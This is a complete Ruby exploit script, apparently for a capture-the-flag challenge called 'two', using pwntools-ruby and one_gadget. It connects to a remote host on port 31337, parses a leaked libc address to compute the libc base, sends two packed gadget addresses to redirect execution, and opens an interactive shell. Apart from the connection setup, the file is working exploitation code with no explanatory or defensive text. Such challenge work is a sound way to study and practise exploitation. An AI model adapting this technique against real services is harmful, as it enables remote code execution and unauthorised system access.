#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget


host, port = '13.113.242.0', 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'two'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64'
context.log_level = :debug

magic = 0x45526
rax_0 = 0x488e0
# gets
libc = z.gets.to_i(16) - 0x203f1
h.offset(libc)

z.write (p64(libc + rax_0) + p64(libc + magic)).ljust(16, "\x00")
z.interact
